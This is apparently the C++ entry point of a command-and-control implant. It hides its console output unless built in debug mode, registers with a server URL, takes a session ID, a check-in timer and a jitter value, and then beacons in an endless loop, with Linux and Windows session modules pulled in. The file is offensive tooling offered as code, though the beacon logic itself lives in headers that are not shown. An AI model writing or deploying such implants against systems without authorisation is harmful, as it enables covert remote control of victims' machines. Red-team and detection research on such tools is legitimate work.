#include <iostream>
#include <string>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>

#include "Generic/config.hpp"
#include "Generic/logging.hpp"

#include "Generic/beacon/httpRequests.hpp"

#ifdef __unix__
#include "Linux/generic.hpp"
#include "Linux/Session/session.hpp"
#endif
#ifdef _WIN32
#include "Windows/generic.hpp"
#include "Windows/Session/session.hpp"
#endif

int main() {
    // Suppress stdout and stderr when DEBUG is not set
    #ifndef DEBUG
    surpressOutput();
    #else
    logger.warn("Debug mode enabled");
    #endif
    logger.warn("Program Starting");

    while (true) {
        try {
            if (ID != "" && JITTER != -1 && TIMER != -1) {
                logger.log("HTTP Reconnect");
                auto result = httpReconnect(URL, ID, JITTER, TIMER);
                if (std::get<0>(result) == -1) {
                    continue;
                }
            } else {
                logger.log("HTTP Connect");
                auto result = httpConnection(URL);
                if (std::get<0>(result) == -1) {
                    continue;
                }
                TIMER = std::get<0>(result);
                logger.log("Timer set to " + std::to_string(TIMER));
                ID = std::get<1>(result);
                logger.log("ID set to " + ID);
                JITTER = std::get<2>(result);
                logger.log("Jitter Set to " + std::to_string(JITTER));

            }
            logger.log("Beaconing");
            int err = beacon();
            if (err == -1) {
                continue;
            }


        } catch (const std::exception& e) {
            logger.error(std::string("Failed to establish HTTP connection: ") + e.what());
            return 1;
        }

    }
    return 0;
}